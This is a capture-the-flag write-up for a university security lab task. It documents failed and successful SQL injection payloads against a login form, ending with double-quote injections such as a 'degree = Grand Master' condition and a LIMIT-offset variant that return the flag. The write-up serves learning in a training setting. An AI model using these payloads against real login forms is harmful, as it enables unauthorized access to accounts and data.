> Club - http://club.tasks.prak.seclab.cs.msu.ru/

### Hm...
- A form with two parameters: `Email` + `Password` → immediately suggests SQL injection.

**First attempts** (none worked at the login level):
```
username=test&pass=test&email=' OR '1'='1
username=test&pass=test&email='--
username=test&pass=test -H "Cookie: session=1' OR '1'='1"
```

**Then tried in the username field:**
```
' OR 1=1 --
' OR 1=1 /*
' OR 1=1; --
' OR 1=1 #
```
– still nothing.

**Union attempts** – always `login failed`, even though I expected an error with column count:
```
' UNION SELECT null --
' UNION SELECT null,null --
' UNION SELECT null,null,null --
```

> [!NOTE]
> `login failed` every time – is that normal?

**Then I replaced `'` with `"` (!)** and got an error:
```
ERROR ====> DB error 1064: ... near '''' at line 1.
```
→ Confirmed SQL injection.

---

### Digging into the table

```
" OR EXISTS(SELECT 1 FROM pages WHERE degree='Grand Master') #
```
→ After this, the test `Grand Master` user logged in successfully.

```
" AND 1=0 UNION SELECT 'Grand Master' #
" OR "1"="1" UNION SELECT 'Grand Master' #
```
→ Those gave `Internal Error`.

**Knowing the existing records, I simply wrote:**
```
" OR degree = 'Grand Master' #
```
→ **Flag found!** 🎉

---

### Another way (alphabetical order)
I noticed that records are stored in **alphabetical order**.  
By clicking through I found the `G` entry, or:

```
" OR 1=1 LIMIT 647,1 #
```
→ Also works.



🎉 **Flag received on the webhook!**
